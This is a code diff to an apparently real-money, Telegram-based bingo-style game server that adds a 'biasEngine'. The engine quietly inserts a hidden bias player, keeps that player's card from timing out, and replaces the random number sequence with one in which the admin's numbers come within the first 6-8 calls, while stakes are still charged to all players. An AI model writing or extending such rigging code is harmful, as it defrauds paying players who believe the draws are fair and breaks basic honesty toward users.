@@ -3,7 +3,7 @@ const { PrismaClient } = require("@prisma/client");
 const { Decimal } = require("decimal.js");
 const cache = require("../cache");
 const { getCard, generateGameId } = require("../utils");
-const { ensureAdminWins } = require("../checker");
+const biasEngine = require("../biasEngine");
 
 const prisma = new PrismaClient();
 
@@ -55,10 +55,29 @@ async function handleGameState(req, res, io) {
       include: { player: true },
     });
 
+    // If bias toggle is ON and game hasn't started, ensure bias player has a card
+    if (!game.startedAt) {
+      try {
+        const biasToggleOn = await biasEngine.getToggle();
+        if (biasToggleOn) {
+          const takenIndices = selections.map((s) => s.index);
+          await biasEngine.ensureBiasSelection(game.id, takenIndices);
+        } else {
+          // Toggle is OFF — remove any existing bias selection
+          await biasEngine.removeBiasSelection(game.id);
+        }
+      } catch (biasErr) {
+        console.error("biasEngine pre-game error:", biasErr);
+      }
+    }
+
     // Release stale selections (no heartbeat for 15s, pre-game)
+    // Skip bias player — their heartbeat is managed by biasEngine
     if (!game.startedAt) {
       for (const sel of selections) {
-        const hbKey = `hb_${game.id}_${sel.player.telegramId}`;
+        const tid = String(sel.player.telegramId);
+        if (tid === String(biasEngine.BIAS_PLAYER_TID)) continue; // skip bias player
+        const hbKey = `hb_${game.id}_${tid}`;
         const lastHb = await cache.get(hbKey);
         if (!lastHb || Date.now() - lastHb > 15000) {
           await prisma.selection.delete({ where: { id: sel.id } });
@@ -156,20 +175,25 @@ async function handleGameState(req, res, io) {
           [sequence[i], sequence[j]] = [sequence[j], sequence[i]];
         }
 
-        // Check admin bias
-        const adminTid = process.env.ADMIN_TID;
-        if (adminTid) {
-          const adminSel = freshSelections.find(
-            (s) => String(s.player.telegramId) === String(adminTid),
-          );
-          if (adminSel) {
-            const biased = ensureAdminWins(
-              game,
-              adminSel.index,
-              freshSelections,
-            );
-            if (biased) sequence = biased;
+        // Initialize bias round if toggle is ON
+        // Returns a biased sequence where admin's numbers are in first 6-8 calls
+        try {
+          const takenIndices = freshSelections.map((s) => s.index);
+          const biasResult = await biasEngine.initBiasRound(game.id, takenIndices);
+          if (biasResult) {
+            // Use the biased sequence instead of the random one
+            sequence = biasResult.biasedSequence;
+
+            // Re-fetch selections to include the bias player's selection
+            const updatedSels = await prisma.selection.findMany({
+              where: { gameId: game.id, accepted: true },
+              include: { player: true },
+            });
+            freshSelections.length = 0;
+            freshSelections.push(...updatedSels);
           }
+        } catch (biasErr) {
+          console.error("biasEngine init error:", biasErr);
         }
 
         game = await prisma.game.update({
@@ -181,7 +205,7 @@ async function handleGameState(req, res, io) {
         });
         started = true;
 
-        // Charge stakes
+        // Charge stakes (includes bias player if present)
         if (!game.stakesCharged) {
           let charged = 0;
           for (const sel of freshSelections) {
